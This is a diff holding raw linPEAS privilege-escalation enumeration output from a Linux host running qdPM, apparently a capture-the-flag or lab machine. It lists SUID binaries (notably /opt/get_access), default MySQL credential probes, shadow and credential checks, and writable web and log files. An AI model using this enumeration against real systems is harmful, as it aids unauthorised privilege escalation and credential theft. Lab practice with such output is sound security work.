+-rwxrwx--- 1 dexter dexter 807 Aug  4  2021 /home/dexter/.profile
+
+
+
+
+╔══════════╣ Analyzing Windows Files (limit 70)
+                                                                                                                                                                                             
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+lrwxrwxrwx 1 root root 20 Sep 25  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
+lrwxrwxrwx 1 root root 24 Sep 25  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
+-rw-r--r-- 1 root root 81 Sep 25  2021 /var/lib/dpkg/alternatives/my.cnf
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+╔══════════╣ Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf                                                                                                                                                             
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+╔══════════╣ MySQL version
+mysql  Ver 8.0.26 for Linux on x86_64 (MySQL Community Server - GPL)                                                                                                                         
+
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No                                                                                                                                   
+═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                   
+                                                                                                                                                                                             
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg                                                                                                                                                                                 
+netpgpkeys Not Found
+netpgp Not Found                                                                                                                                                                             
+                                                                                                                                                                                             
+-rw-r--r-- 1 root root 20473 Sep 25  2021 /etc/apt/trusted.gpg
+-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
+-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
+-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
+-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root 7443 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root 7452 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root 2263 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
+-rw-r--r-- 1 root root 2899 Apr 22  2021 /usr/share/gnupg/distsigkey.gpg
+-rw-r--r-- 1 root root 8700 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
+-rw-r--r-- 1 root root 8709 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
+-rw-r--r-- 1 root root 2453 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
+-rw-r--r-- 1 root root 8132 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root 8141 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root 2332 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root 55625 Feb 25  2021 /usr/share/keyrings/debian-archive-keyring.gpg
+-rw-r--r-- 1 root root 36873 Feb 25  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 7443 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root 7452 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root 2263 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg
+
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd                                                                                                                                                               
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+passwd file: /var/www/html/core/lib/vendor/symfony/test/unit/util/fixtures/finder_permissions/secret/passwd
+
+╔══════════╣ Searching ssl/ssh files
+╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                  
+                                                                                                                                                                                             
+
+
+
+
+-rw-r--r-- 1 root root 173 Sep 25  2021 /etc/ssh/ssh_host_ecdsa_key.pub
+-rw-r--r-- 1 root root 93 Sep 25  2021 /etc/ssh/ssh_host_ed25519_key.pub
+-rw-r--r-- 1 root root 565 Sep 25  2021 /etc/ssh/ssh_host_rsa_key.pub
+
+ChallengeResponseAuthentication no
+UsePAM yes
+══╣ Some certificates were found (out limited):
+/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                                                 
+/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
+/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
+/etc/ssl/certs/AffirmTrust_Commercial.pem
+/etc/ssl/certs/AffirmTrust_Networking.pem
+/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
+/etc/ssl/certs/AffirmTrust_Premium.pem
+/etc/ssl/certs/Amazon_Root_CA_1.pem
+/etc/ssl/certs/Amazon_Root_CA_2.pem
+/etc/ssl/certs/Amazon_Root_CA_3.pem
+/etc/ssl/certs/Amazon_Root_CA_4.pem
+/etc/ssl/certs/Atos_TrustedRoot_2011.pem
+/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
+/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
+/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
+/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
+/etc/ssl/certs/ca-certificates.crt
+/etc/ssl/certs/CA_Disig_Root_R2.pem
+/etc/ssl/certs/Certigna.pem
+/etc/ssl/certs/Certigna_Root_CA.pem
+720PSTORAGE_CERTSBIN
+
+══╣ Writable ssh and gpg agents
+/etc/systemd/user/sockets.target.wants/gpg-agent.socket                                                                                                                                      
+/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config                                                                                                                                                               
+Include /etc/ssh/sshd_config.d/*.conf
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow                                                                                                                                                                             
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+
+
+
+100  932k  100  932k    0     0   7681      0  0:02:04  0:02:04 --:--:--  7741
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                           
+                      ╚════════════════════════════════════╝                                                                                                                                 
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                              
+strace Not Found                                                                                                                                                                             
+-rwsr-xr-x 1 root root 17K Sep 25  2021 /opt/get_access (Unknown SUID binary!)                                                                                                               
+-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 35K Jul 28  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 71K Jul 28  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 55K Jul 28  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 471K Mar 13  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51K Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                              
+-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry                                                                                                                                    
+-rwxr-sr-x 1 root ssh 347K Mar 13  2021 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
+-rwxr-sr-x 1 root tty 35K Jul 28  2021 /usr/bin/wall
+-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 23K Jul 28  2021 /usr/bin/write.ul (Unknown SGID binary)
+-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 38K Jul  9  2021 /usr/sbin/unix_chkpwd
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                       
+files with acls in searched folders Not Found                                                                                                                                                
+                                                                                                                                                                                             
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                               
+══╣ Current shell capabilities                                                                                                                                                               
+sh: 7520: [[: not found                                                                                                                                                                      
+CapInh:  [Invalid capability format]
+sh: 7520: [[: not found
+CapPrm:  [Invalid capability format]
+sh: 7511: [[: not found
+CapEff:  [Invalid capability format]
+sh: 7520: [[: not found
+CapBnd:  [Invalid capability format]
+sh: 7520: [[: not found
+CapAmb:  [Invalid capability format]
+
+╚ Parent process capabilities
+sh: 7545: [[: not found                                                                                                                                                                      
+CapInh:  [Invalid capability format]
+sh: 7545: [[: not found
+CapPrm:  [Invalid capability format]
+sh: 7536: [[: not found
+CapEff:  [Invalid capability format]
+sh: 7545: [[: not found
+CapBnd:  [Invalid capability format]
+sh: 7545: [[: not found
+CapAmb:  [Invalid capability format]
+
+
+Files with capabilities (limited to 50):
+/usr/bin/ping cap_net_raw=ep
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                       
+/etc/ld.so.conf                                                                                                                                                                              
+Content of /etc/ld.so.conf:                                                                                                                                                                  
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                                                                                                                                           
+  - /usr/lib/x86_64-linux-gnu/libfakeroot                                                                                                                                                    
+  /etc/ld.so.conf.d/libc.conf
+  - /usr/local/lib                                                                                                                                                                           
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                          
+  - /lib/x86_64-linux-gnu
+  - /usr/lib/x86_64-linux-gnu
+
+/etc/ld.so.preload
+╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                              
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                             
+total 12                                                                                                                                                                                     
+drwxr-xr-x  2 root root 4096 Sep 25  2021 .
+drwxr-xr-x 80 root root 4096 Jun 10 08:24 ..
+-rw-r--r--  1 root root  726 Aug 12  2020 bash_completion.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                 
+                                                                                                                                                                                             
+╔══════════╣ AppArmor binary profiles
+-rw-r--r-- 1 root root 3448 Feb 19  2021 usr.bin.man                                                                                                                                         
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                                                                                                 
+═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                 
+═╣ Can I read shadow files? ............. No                                                                                                                                                 
+═╣ Can I read shadow plists? ............ No                                                                                                                                                 
+═╣ Can I write shadow plists? ........... No                                                                                                                                                 
+═╣ Can I read opasswd file? ............. No                                                                                                                                                 
+═╣ Can I write in network-scripts? ...... No                                                                                                                                                 
+═╣ Can I read root folder? .............. No                                                                                                                                                 
+                                                                                                                                                                                             
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/                                                                                                                                                                                       
+/root/
+/var/www
+/var/www/html
+/var/www/html/readme.txt
+/var/www/html/core
+/var/www/html/core/plugins
+/var/www/html/core/plugins/.sf
+/var/www/html/core/log
+/var/www/html/core/.htaccess
+/var/www/html/core/test
+/var/www/html/core/test/bootstrap
+/var/www/html/core/test/bootstrap/functional.php
+/var/www/html/core/test/bootstrap/unit.php
+/var/www/html/core/test/functional
+/var/www/html/core/test/functional/frontend
+/var/www/html/core/test/functional/frontend/.sf
+/var/www/html/core/test/functional/qdPMExtended
+/var/www/html/core/test/functional/qdPMExtended/discussionsCommentsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/usersTasksReportActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/tasksStatusActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/timeReportActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/toolsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/projectRolesActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/tasksActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/ticketsCommentsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/ticketsGroupsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/versionsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/projectsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/departmentsActionsTest.php
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+                                                                                                                                                                                             
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+                                                                                                                                                                                             
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                             
+/dev/mqueue                                                                                                                                                                                  
+/dev/shm
+/home/dexter
+/home/dexter/.bash_history
+/home/dexter/.bash_logout
+/home/dexter/.bashrc
+/home/dexter/.gnupg
+/home/dexter/.gnupg/private-keys-v1.d
+/home/dexter/.gnupg/pubring.kbx
+/home/dexter/.gnupg/trustdb.gpg
+/home/dexter/.local
+/home/dexter/.local/share
+/home/dexter/.local/share/nano
+/home/dexter/note.txt
+/home/dexter/.profile
+/run/lock
+/run/user/1001
+/run/user/1001/gnupg
+/run/user/1001/systemd
+/run/user/1001/systemd/inaccessible
+/run/user/1001/systemd/inaccessible/dir
+/run/user/1001/systemd/inaccessible/reg
+/run/user/1001/systemd/units
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/var/lib/php/sessions
+/var/tmp
+/var/www/html/core/cache
+/var/www/html/core/cache/qdPM
+/var/www/html/core/cache/qdPM/prod
+/var/www/html/core/cache/qdPM/prod/config
+/var/www/html/core/cache/qdPM/prod/config/config_app.yml.php
+/var/www/html/core/cache/qdPM/prod/config/config_autoload.yml.php
+/var/www/html/core/cache/qdPM/prod/config/config_config_handlers.yml.php
+/var/www/html/core/cache/qdPM/prod/config/config_databases.yml.php
+/var/www/html/core/cache/qdPM/prod/config/config_factories.yml.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/html/core/cache/qdPM/prod/i18n
+/var/www/html/core/config
+/var/www/html/core/config/databases.yml.sample
+/var/www/html/core/config/doctrine
+/var/www/html/core/config/doctrine/schema.yml
+/var/www/html/core/config/error
+/var/www/html/core/config/error/exception.html.php
+/var/www/html/core/config/ProjectConfiguration.class.php
+/var/www/html/core/config/properties.ini
+/var/www/html/core/config/rsync_exclude.txt
+/var/www/html/core/log
+/var/www/html/core/log/qdPM_prod.log
+/var/www/html/uploads/attachments
+/var/www/html/uploads/attachments/.htaccess
+/var/www/html/uploads/users
+/var/www/html/uploads/users/.htaccess
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                             
+  Group dexter:                                                                                                                                                                              
+/home/dexter                                                                                                                                                                                 
+/home/dexter/note.txt
+/home/dexter/.bash_logout
+/home/dexter/.profile
+/home/dexter/.local
+/home/dexter/.local/share
+/home/dexter/.local/share/nano
+/home/dexter/.bash_history
+/home/dexter/.bashrc
+
+
+
+                            ╔═════════════════════════╗
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                          
+                            ╚═════════════════════════╝                                                                                                                                      
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                     
+/usr/bin/gettext.sh                                                                                                                                                                          
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2021-09-25+09:26:48.4731365370 /home/dexter/.bash_history                                                                                                                                    
+2021-09-25+09:25:20.0327416670 /opt/get_access
+2021-09-25+08:37:36.9977726850 /home/dexter/note.txt
+2021-09-25+06:09:56.0339024710 /etc/console-setup/cached_setup_terminal.sh
+2021-09-25+06:09:56.0339024710 /etc/console-setup/cached_setup_font.sh
+2021-09-25+06:09:56.0299024710 /etc/console-setup/cached_setup_keyboard.sh
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 28                                                                                                                                                                                     
+drwxr-xr-x  2 root root  4096 Sep 25  2021 .
+drwxr-xr-x 18 root root  4096 Sep 25  2021 ..
+-rwsr-xr-x  1 root root 16816 Sep 25  2021 get_access
+
+╔══════════╣ Unexpected in root
+/vmlinuz.old                                                                                                                                                                                 
+/initrd.img.old
+/initrd.img
+/vmlinuz
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/etc/resolv.conf                                                                                                                                                                             
+/home/dexter/.gnupg/trustdb.gpg
+/home/dexter/.gnupg/pubring.kbx
+/var/log/syslog
+/var/log/auth.log
+/var/log/daemon.log
+/var/log/journal/9118611b7d354681a45254808419d66c/system.journal
+/var/log/journal/9118611b7d354681a45254808419d66c/user-1001.journal
+/var/log/journal/9118611b7d354681a45254808419d66c/user-1002.journal
+
+╔══════════╣ Writable log files (logrotten) (limit 50)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation                                                                                     
+logrotate 3.18.0                                                                                                                                                                             
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+Writable: /var/www/html/core/log/qdPM_prod.log
+╔══════════╣ Syslog configuration (limit 50)                                                                                                                                                 
+                                                                                                                                                                                             
+
+
+module(load="imuxsock") # provides support for local system logging
+module(load="imklog")   # provides kernel logging support
+
+
+
+
+
+$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat
+
+$FileOwner root
+$FileGroup adm
+$FileCreateMode 0640
+$DirCreateMode 0755
+$Umask 0022
+
+$WorkDirectory /var/spool/rsyslog
+
+$IncludeConfig /etc/rsyslog.d/*.conf
+
+
+
+auth,authpriv.*                 /var/log/auth.log
+*.*;auth,authpriv.none          -/var/log/syslog
+daemon.*                        -/var/log/daemon.log
+kern.*                          -/var/log/kern.log
+lpr.*                           -/var/log/lpr.log
+mail.*                          -/var/log/mail.log
+user.*                          -/var/log/user.log
+
+mail.info                       -/var/log/mail.info
+mail.warn                       -/var/log/mail.warn
+mail.err                        /var/log/mail.err
+
+*.=debug;\
+        auth,authpriv.none;\
+        mail.none               -/var/log/debug
+*.=info;*.=notice;*.=warn;\
+        auth,authpriv.none;\
+        cron,daemon.none;\
+        mail.none               -/var/log/messages
+
+*.emerg                         :omusrmsg:*
+╔══════════╣ Auditd configuration (limit 50)
+auditd configuration Not Found                                                                                                                                                               
+╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                                                
+   393354    924 -rw-r-----   1 root     adm        940597 Jun 10 08:24 /var/log/syslog                                                                                                      
+   393359    124 -rw-r-----   1 root     adm        119268 Jun 10 08:24 /var/log/auth.log
+   393358    212 -rw-r-----   1 root     adm        212945 Jun 10 08:24 /var/log/daemon.log
+   393357    660 -rw-r-----   1 root     adm               669322 Jun 10 08:15 /var/log/messages
+   393355    700 -rw-r-----   1 root     adm               711333 Jun 10 08:15 /var/log/kern.log
+   393850    140 -rw-r-----   1 root     adm               138129 Sep 25  2021 /var/log/apt/term.log
+   393356     60 -rw-r-----   1 root     adm                53509 Jun 10 08:15 /var/log/debug
+
+╔══════════╣ Files inside /home/dexter/ (limit 20)
+total 36                                                                                                                                                                                     
+drwxrwx--- 4 dexter dexter 4096 Jun 10 08:24 .
+drwxr-xr-x 4 root   root   4096 Sep 25  2021 ..
+-rwxrwx--- 1 dexter dexter    6 Sep 25  2021 .bash_history
+-rwxrwx--- 1 dexter dexter  220 Aug  4  2021 .bash_logout
+-rwxrwx--- 1 dexter dexter 3526 Aug  4  2021 .bashrc
+drwx------ 3 dexter dexter 4096 Jun 10 08:24 .gnupg
+drwxrwx--- 3 dexter dexter 4096 Sep 25  2021 .local
+-rwxrwx--- 1 dexter dexter  198 Sep 25  2021 note.txt
+-rwxrwx--- 1 dexter dexter  807 Aug  4  2021 .profile
+
+╔══════════╣ Files inside others home (limit 20)
+/var/www/html/readme.txt                                                                                                                                                                     
+/var/www/html/core/plugins/.sf
+/var/www/html/core/log/qdPM_prod.log
+/var/www/html/core/.htaccess
+/var/www/html/core/test/bootstrap/functional.php
+/var/www/html/core/test/bootstrap/unit.php
+/var/www/html/core/test/functional/frontend/.sf
+/var/www/html/core/test/functional/qdPMExtended/discussionsCommentsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/usersTasksReportActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/tasksStatusActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/timeReportActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/toolsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/projectRolesActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/tasksActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/ticketsCommentsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/ticketsGroupsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/versionsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/projectsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/departmentsActionsTest.php
+/var/www/html/core/test/functional/qdPMExtended/contactsGroupsActionsTest.php
+
+╔══════════╣ Searching installed mail applications
+                                                                                                                                                                                             
+╔══════════╣ Mails (limit 50)
+                                                                                                                                                                                             
+╔══════════╣ Backup folders
+drwxr-xr-x 2 root root 4096 Jun 10 04:01 /var/backups                                                                                                                                        
+total 676
+-rw-r--r-- 1 root root  51200 Jun 10 03:57 alternatives.tar.0
+-rw-r--r-- 1 root root   1664 Sep 25  2021 alternatives.tar.1.gz
+-rw-r--r-- 1 root root  16891 Sep 25  2021 apt.extended_states.0
+-rw-r--r-- 1 root root      0 Jun 10 03:57 dpkg.arch.0
+-rw-r--r-- 1 root root     32 Sep 25  2021 dpkg.arch.1.gz
+-rw-r--r-- 1 root root    356 Sep 25  2021 dpkg.diversions.0
+-rw-r--r-- 1 root root    126 Sep 25  2021 dpkg.diversions.1.gz
+-rw-r--r-- 1 root root    172 Sep 25  2021 dpkg.statoverride.0
+-rw-r--r-- 1 root root    142 Sep 25  2021 dpkg.statoverride.1.gz
+-rw-r--r-- 1 root root 490260 Sep 25  2021 dpkg.status.0
+-rw-r--r-- 1 root root  99946 Sep 25  2021 dpkg.status.1.gz
+
+drwxr-xr-x 2 root root 4096 Jun 30  2021 /var/www/html/backups
+total 0
+
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz                                                                                                            
+-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
+-rw-r--r-- 1 root root 9483 Sep 23  2021 /usr/lib/modules/5.10.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 35528 Aug 19  2021 /usr/lib/mysql/plugin/component_mysqlbackup.so
+-rw-r--r-- 1 root root 3147 Apr  2  2015 /var/www/html/core/apps/qdPM/modules/tools/templates/backupSuccess.php
+-rw-r--r-- 1 root root 1376 Sep 15  2014 /var/www/html/batch/backups.php
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /etc/alternatives/regulatory.db: symbolic link to /lib/firmware/regulatory.db-debian                                                                                                   
+Found /var/lib/dpkg/alternatives/regulatory.db: ASCII text
+Found /var/www/html/core/data/sandbox.db: empty
+Found /var/www/html/template/plugins/uniform/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
+
+
+╔══════════╣ Web files?(output limit)
+/var/www/:                                                                                                                                                                                   
+total 16M
+drwxrwxr-x  3 root root 4.0K Sep 25  2021 .
+drwxr-xr-x 12 root root 4.0K Sep 25  2021 ..
+drwxrwxr-x 12 root root 4.0K Sep 25  2021 html
+-rw-r--r--  1 root root  16M Jul  1  2021 qdPM_9.2.zip
+
+/var/www/html:
+total 76K
+drwxrwxr-x 12 root root 4.0K Sep 25  2021 .
+
+╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 0 Jun 10 08:15 /run/network/.ifstate.lock                                                                                                                             
+-rw-r--r-- 1 root root 220 Aug  4  2021 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Sep 25  2021 /etc/.pwd.lock
+-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch
+-rwxrwx--- 1 dexter dexter 220 Aug  4  2021 /home/dexter/.bash_logout
+-rw-r--r-- 1 root root 0 Dec 13  2011 /var/www/html/core/plugins/.sf
+-rw-r--r-- 1 root root 33 Apr 13  2010 /var/www/html/core/.htaccess
+-rw-r--r-- 1 root root 0 Dec 13  2011 /var/www/html/core/test/functional/frontend/.sf
+-rw-r--r-- 1 root root 0 Dec 13  2011 /var/www/html/core/test/unit/.sf
+-rw-r--r-- 1 root root 130 Oct 27  2019 /var/www/html/core/lib/htmlpurifier/4.12.0/benchmarks/.htaccess
+-rw-r--r-- 1 root root 130 Oct 27  2019 /var/www/html/core/lib/htmlpurifier/4.12.0/maintenance/.htaccess
+-rw-r--r-- 1 root root 8541 Apr 26  2020 /var/www/html/core/lib/PhpSpreadsheet-master/vendor/phpoffice/phpspreadsheet/.php_cs.dist
+-rw-r--r-- 1 root root 859 Apr 26  2020 /var/www/html/core/lib/PhpSpreadsheet-master/vendor/phpoffice/phpspreadsheet/.scrutinizer.yml
+-rw-r--r-- 1 root root 271 Apr 26  2020 /var/www/html/core/lib/PhpSpreadsheet-master/vendor/psr/simple-cache/.editorconfig
+-rw-r--r-- 1 root root 34 Aug 18  2013 /var/www/html/template/plugins/bootstrap-datepicker/.hgignore
+-rw-r--r-- 1 root root 541 Aug 18  2013 /var/www/html/template/plugins/bootstrap-datepicker/.hgtags
+-rw-r--r-- 1 root root 36 Mar 22  2013 /var/www/html/template/plugins/jquery-validation/demo/captcha/images/.htaccess
+-rw-r--r-- 1 root root 33 Apr 13  2010 /var/www/html/batch/.htaccess
+-rw-r--r-- 1 root root 1183 Feb  5  2021 /var/www/html/.htaccess
+-rw-r--r-- 1 root root 33 Apr 13  2010 /var/www/html/backups/.htaccess
+-rwxr-xrwx 1 root root 266 Nov 15  2010 /var/www/html/uploads/users/.htaccess
+-rwxr-xrwx 1 root root 33 Apr 13  2010 /var/www/html/uploads/attachments/.htaccess
+-rw-r--r-- 1 root root 266 Nov 15  2010 /var/www/html/uploads/.htaccess
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-r--r-- 1 root root 32 Sep 25  2021 /var/backups/dpkg.arch.1.gz                                                                                                                           
+-rw-r--r-- 1 root root 51200 Jun 10 03:57 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 0 Jun 10 03:57 /var/backups/dpkg.arch.0
+-rw-r--r-- 1 root root 1664 Sep 25  2021 /var/backups/alternatives.tar.1.gz
+-rw-r--r-- 1 root root 33 Apr 13  2010 /var/www/html/backups/.htaccess
+
+╔══════════╣ Searching passwords in history files
+/usr/share/rubygems-integration/all/gems/rake-13.0.3/lib/rake/thread_history_display.rb:      @stats   = stats                                                                               
+/usr/share/rubygems-integration/all/gems/rake-13.0.3/lib/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
+/usr/share/rubygems-integration/all/gems/rake-13.0.3/lib/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
+
